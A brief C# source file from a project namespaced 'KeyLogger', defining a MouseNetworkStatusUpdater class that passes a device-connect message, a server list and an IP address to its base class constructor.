using System.Collections.Generic;
using KeyLogger.Messages;

namespace KeyLogger.Network.Status
{
    public class MouseNetworkStatusUpdater : NetworkStatusUpdater
    {
        public MouseNetworkStatusUpdater(List<Server> serverlist, string ip)
            : base(new DeviceConnectRequestMessage {Mouse = false}, serverlist, ip)
        {
        }
    }
}